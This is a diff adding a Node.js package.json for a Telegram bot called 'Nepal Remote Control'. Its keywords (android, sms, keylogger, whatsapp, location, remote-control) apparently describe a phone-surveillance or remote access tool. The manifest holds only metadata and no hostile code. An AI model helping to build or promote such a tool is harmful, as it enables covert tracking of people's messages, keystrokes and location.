@@ -1,0 +1,38 @@
+{
+  "name": "GentleMan:- BOT",
+  "version": "1.0.0",
+  "description": "GentleMan:- BOT | Nepal Remote Control",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "telegraf": "^4.16.3",
+    "express": "^4.19.2",
+    "dotenv": "^16.4.5",
+    "moment-timezone": "^0.5.45"
+  },
+  "engines": {
+    "node": ">=18"
+  },
+  "author": "GentleMan",
+  "license": "ISC",
+  "keywords": [
+    "telegram-bot",
+    "nepal",
+    "remote-control",
+    "android",
+    "sms",
+    "keylogger",
+    "whatsapp",
+    "location"
+  ],
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/GentleMan-Nepal/BOT-Control.git"
+  },
+  "homepage": "https://gentleman-bot.glitch.me",
+  "bugs": {
+    "url": "https://t.me/GentleMan_BOT_Support"
+  }
+}
